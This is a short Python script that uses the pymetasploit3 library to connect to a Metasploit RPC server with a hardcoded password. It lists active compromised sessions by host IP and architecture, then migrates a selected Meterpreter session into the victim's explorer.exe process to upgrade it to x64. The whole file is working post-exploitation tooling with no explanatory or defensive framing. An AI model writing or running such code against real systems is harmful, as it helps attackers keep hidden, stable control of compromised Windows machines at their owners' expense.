from time import sleep 
from library.pymetasploit3.msfrpc import MsfRpcClient

def init(client,sid):
    session = client.sessions.session(sid)
    session.write("ps")
    sleep(5)
    for line in session.read().split("\n"):
        if "explorer.exe" in line:
            print(line)
            explorer = line.split(" ")
            pid = explorer[1]
            session.run_with_output("migrate {}".format(pid), timeout = 150)
            print("Session has successfully migrated, meterpreter has upgraded to x64!")
    exit()

if __name__ == '__main__':
    client = MsfRpcClient('123',port=55552)
    print("Select sessions to proceed: \n")
    if len(client.sessions.list.items())<1 :
        print("There are no sessions available")
        exit()
    for id,c in client.sessions.list.items():
        print("{})".format(id),"IP: {}".format(c.get('session_host')),"| {}".format(c.get('desc')),"{}".format(c.get('arch')))
    print("---------------------------------")
    sid = input()
    print("--------------------------------- \n")
    init(client,sid)